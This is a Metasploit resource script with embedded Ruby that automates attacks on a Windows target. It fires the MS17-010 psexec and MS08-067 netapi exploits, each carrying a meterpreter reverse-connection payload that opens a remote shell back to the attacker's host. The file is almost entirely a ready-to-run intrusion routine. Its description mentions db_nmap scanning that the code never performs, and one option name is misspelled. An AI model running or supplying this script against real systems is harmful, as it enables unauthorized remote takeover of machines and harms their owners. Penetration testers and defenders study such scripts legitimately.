<ruby>
   help = %Q|
      Description:
      This Metasploit RC file can be used to automate the exploitation process.
      In this example we use db_nmap to populate msfdb database with hosts.
      
   |
   print_line(help)
   Rex::sleep(0.5)
   if (framework.datastore['RHOST'] == nil or framework.datastore['RHOST'] == '')
      print_line("[!] Please set RHOST")
      return nil
   end
   if (framework.datastore['LHOST'] == nil or framework.datastore['LHOST'] == '')
      print_line("[!] Please set an LHOST")
      return nil
   end
   run_single("services")
   run_single("setg RHOSTS #{framework.datastore['RHOST']}")
   run_single("use exploit/windows/smb/ms17_010_psexec")
   run_single("set PAYLOAD windows/meterpreter/reverse_http")
   run_single("set LHOST #{framework.datastore['LHOST']}")
   run_single("set LPORT 8082")
   run_single("set DisablePayloadHandler True")
   run_single("exploit -j -z")
   Rex::sleep(5.0)
   run_single("setg RHOSTS #{framework.datastore['RHOST']}")
   run_single("use exploit/windows/smb/ms08_067_netapi")
   run_single("set PAYLOAD windows/meterpreter/reverse_tcp")
   run_single("set LHOST #{framework.datastore['LHOST']}")
   run_single("set LPORT 8082")
   run_single("set DisablePayloadHander True")
   run_single("exploit -j -z")

</ruby>

